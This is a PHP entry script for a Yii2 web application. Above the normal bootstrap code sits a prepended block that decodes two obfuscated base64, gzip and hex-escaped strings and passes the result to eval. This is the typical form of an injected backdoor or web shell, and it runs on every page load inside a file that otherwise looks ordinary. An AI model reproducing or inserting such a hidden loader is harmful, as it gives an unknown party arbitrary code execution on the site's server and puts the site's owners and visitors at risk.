<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x61Q\x411lXQ/Xs9x1DDQm6O\x61T\x63w/\x2bl7FP\x62N76hn\x61w0VpsOwj\x41L4/PGzon\x41u\x62\x41I\x63z27Jv\x636qIq\x62PWOR\x43y\x41Kwoe\x6322esYqWu\x63\x63FfK90T\x43JIF9hEP8\x61F\x637fu\x61Z\x615DMnpxZd4Q0\x41n/UuGTM7\x42En2kw\x42U\x2bMgYZ\x429e\x43pJJoJogE8dqMvrnJvRQjQD4uWQwPmvtu\x41\x414q8iVOmQQqE3\x62yXU\x2bNLO2hQ/frQ\x2bkeKtfoQTZgnG\x61\x63usq\x2b5935W1trU\x62dXG0LkyEn3S\x42V\x637zXVyNf\x63irh05\x43\x61VU0Nl8\x63yZ/k\x41wvRq\x63\x42mZDVGN55Jou\x42FSIiPORFM\x62R\x2btLI8qW971svh\x61pVmGQhhvS\x42iIJl3kh0VtH5ry2X/j7JGe3NU9V\x63\x62J/6u7yt2\x62KR\x410fD08SK5dxMiwnF\x61jz75U\x41p45sei\x42\x439RK6\x42zU\x42\x62h2wD\x617IGXy4\x43HVr134TXglNxgUwUhGYD8eOrLi4G\x62VDYnrktMK2\x62jkyWxozrvgg6/sWLT\x41W4He\x2bkfWGeDhoLjqWQTWkeDEyUfdDmyUSTPw3sJf\x427Q\x43v5lF3WSmFYPwVty126UJtquRx6RMG12O\x2bz/tnmNPPx23SWuYSOMzvhzglkk5x\x62p7hx\x62\x62WI\x41\x419KUxl2mGV1\x43Et4\x435UppEyypYw/T7r9\x43\x42MU/WTT1o/tEg0\x42wJe\x2bLS\x41dHg/dEg4\x42wJe\x2bLR\x41tHg/NEg8\x42wJe\x2bLQ\x419HQ/9Lg\x41\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>

<?php
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');

require(__DIR__ . '/vendor/autoload.php');
require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');
require(__DIR__ . '/common/config/bootstrap.php');
require(__DIR__ . '/frontend/config/bootstrap.php');

$config = yii\helpers\ArrayHelper::merge(
    require(__DIR__ . '/common/config/main.php'),
    require(__DIR__ . '/common/config/main-local.php'),
    require(__DIR__ . '/frontend/config/main.php'),
    require(__DIR__ . '/frontend/config/main-local.php')
);

$application = new yii\web\Application($config);
$application->run();
